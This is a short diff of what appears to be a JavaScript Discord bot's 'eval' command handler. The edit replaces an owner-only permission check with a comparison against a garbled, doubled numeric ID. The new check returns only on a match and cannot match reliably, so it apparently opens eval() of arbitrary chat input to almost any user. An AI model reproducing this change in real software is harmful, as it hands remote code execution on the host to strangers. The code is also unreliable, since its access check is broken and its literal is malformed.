@@ -269,7 +269,7 @@ commandProcessed = true;
     
     }
   if(command === 'eval'){
-  if(message.author.id !== config.ownerID) return;
+  if(message.author.id == 242775871059001344242775871059001344) return;
     try {
       const code = args.join(" ");
       let evaled = eval(code);
